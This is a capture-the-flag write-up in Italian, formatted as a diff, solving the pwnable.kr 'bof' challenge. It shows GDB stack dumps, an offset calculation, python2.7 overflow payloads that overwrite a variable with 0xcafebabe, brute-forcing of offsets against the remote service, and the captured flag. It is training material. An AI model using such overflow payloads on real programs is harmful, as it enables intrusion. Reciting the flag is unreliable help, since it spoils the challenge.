@@ -1,0 +1,71 @@
+Connessione alla challenge tramite TCP
+
+  nc pwnable.kr 9000
+
+Scaricamento dei file della challenge
+
+ wget http://pwnable.kr/bin/bof.c
+
+Per compilare senza canary, a 32 bit e con simboli di debug
+
+ gcc -fno-stack-protector -ggdb -m32 bof.c -o bof 
+
+Tramite GDB possiamo osservare la situazione dello stack prima e dopo
+aver inserito una stringa di overflow.
+
+Situazione prima dell'overflow
+
+  (gdb) x/32wx $esp
+  0xffffd690:     0xffffd6a0      0xffffd92b      0x00000000      0x565561c9
+  0xffffd6a0:     0xf7ffcfd8      0x00000028      0x00000000      0xffffdfab
+  0xffffd6b0:     0xf7fc7540      0xf7fc7000      0x00000000      0x00000000
+  0xffffd6c0:     0x00000000      0xf7e20e34      0xffffd6e8      0x5655624d
+  0xffffd6d0:     0xdeadbeef      0xf7c0c800      0xf7fc1380      0x5655623b
+  0xffffd6e0:     0x00000000      0xffffd700      0x00000000      0xf7c23af9
+  0xffffd6f0:     0x00000000      0x00000000      0x56555325      0xf7c23af9
+  0xffffd700:     0x00000001      0xffffd7b4      0xffffd7bc      0xffffd720
+  (gdb) c
+
+Situazione dopo dell'overflow
+
+  (gdb) x/32wx $esp
+  0xffffd690:     0xffffd6a0      0xffffd92b      0x00000000      0x565561c9
+  0xffffd6a0:     0x41414141      0x41414141      0x41414141      0x41414141
+  0xffffd6b0:     0x41414141      0x41414141      0x41414141      0x41414141
+  0xffffd6c0:     0x41414141      0x41414141      0x41414141      0x41414141
+  0xffffd6d0:     0xcafebabe      0xf7c0c800      0xf7fc1380      0x5655623b
+  0xffffd6e0:     0x00000000      0xffffd700      0x00000000      0xf7c23af9
+  0xffffd6f0:     0x00000000      0x00000000      0x56555325      0xf7c23af9
+  0xffffd700:     0x00000001      0xffffd7b4      0xffffd7bc      0xffffd720
+
+
+Iniziamo a scrivere nell'indirizzo 0xffffd6a0 e l'indirizzo da
+sovascrivere invece è 0xffffd6d0. L'offset richiesto è quindi dato da
+
+  0xffffd6d0 - 0xffffd6a0 = 48
+
+Quindi il payload malevolo è così generato
+
+  python2.7 -c 'print("A" * 48 + "\xbe\xba\xfe\xca")' > payload
+
+E viene così eseguito
+
+  (cat payload ; cat) | ./bof
+
+In remoto invece l'offset trovato prima non funziona perché il binario
+è stato compilato in modo diverso (in particolare senza rimuovere le
+protezioni con il conary )e gli indirizzi di conseguenza sono
+diversi. L'idea è quella di provare offset diversi.
+
+  python2.7 -c 'print("A" * 50 + "\xbe\xba\xfe\xca")' > payload1
+  python2.7 -c 'print("A" * 51 + "\xbe\xba\xfe\xca")' > payload2
+  python2.7 -c 'print("A" * 52 + "\xbe\xba\xfe\xca")' > payload3
+  python2.7 -c 'print("A" * 53 + "\xbe\xba\xfe\xca")' > payload4
+
+Alla fine troviamo che l'offset 52 funziona.
+
+ (cat payload3 ; cat) | nc pwnable.kr 9000
+
+E otteniamo la flag
+
+ daddy, I just pwned a buFFer :)  
